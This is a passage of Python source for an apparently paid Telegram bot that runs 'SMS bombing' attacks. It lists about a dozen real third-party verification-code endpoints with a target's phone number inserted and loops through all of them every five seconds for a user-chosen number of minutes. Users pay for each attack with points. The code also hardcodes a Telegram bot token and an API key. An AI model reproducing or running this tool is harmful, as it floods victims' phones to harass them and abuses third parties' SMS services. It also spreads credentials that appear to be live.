            f"https://fyxrd.168fb.cn/master_renda/public/api/Login/sendsms?phone={target_phone}&user_type=2",
            f"https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile={target_phone}",
            f"https://apis.niuxuezhang.cn/v1/sms-code?phone={target_phone}",
            f"https://wccy-server.sxlyb.com/open/v1/login-code/{target_phone}?phone={target_phone}",
            f"https://mapi.ekwing.com/parent/user/sendcode?scenes=login&tel={target_phone}&v=9.0&os=Windows",
            f"https://qxt.matefix.cn/api/wx/common/sendMsgCode?mobile={target_phone}",
            f"https://www.huameitang.com/api.php?do=getMobileCode&mobile={target_phone}",
            f"https://api.hichefu.com/client-openapi/driver/user/getVerifyCode?phone={target_phone}",
            f"https://www.xinmeinet.cn/api/user/getMsg?status=1&touch={target_phone}",
            f"http://n103.top:84/smsboom/?hm={idcard}",
            f"http://43.134.229.155/api/index/submit?key=ff102125815e3df1974a7be53afd4794&phone=[target_phone]&time=5"
            
        ]

        while datetime.now() < end_time:
            for url in urls:
                try:
                    response = requests.get(url)
                except Exception as e:
                    pass  # 忽略错误，不输出任何信息
            time.sleep(5)  # 调整时间间隔
        
        await update.message.reply_text(f"✅ 轰炸已完成，对 {target_phone} 持续了 {minutes} 分钟。当前剩余积分：{user_points[user_id]}")

    except ValueError:
        await update.message.reply_text("⚠️ 请输入有效的时间（至少 5 分钟）")

if __name__ == '__main__':
    keep_alive()
    app = ApplicationBuilder().token("7897115663:AAG56gikZ4qUeOHtn3seZtAYXWfWDDMbt_Q").build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("start", handle_new_user_join))
    app.add_handler(CommandHandler("qd", qd))
    app.add_handler(CommandHandler("dxhz", dxhz))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("invite", invite_command))
    app.add_handler(CommandHandler("price", price_command))
    app.add_handler(CommandHandler("addtoken", add_token))
    app.add_handler(CommandHandler("hb", hb))
    app.add_handler(MessageHandler(filters.Regex(r"^/start hb_\w+"), claim_hongbao))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^\d+$'), collect_time_input))
    app.add_handler(MessageHandler(filters.Regex(r"^/start a_\d+$"), handle_new_user_join))
    app.run_polling()

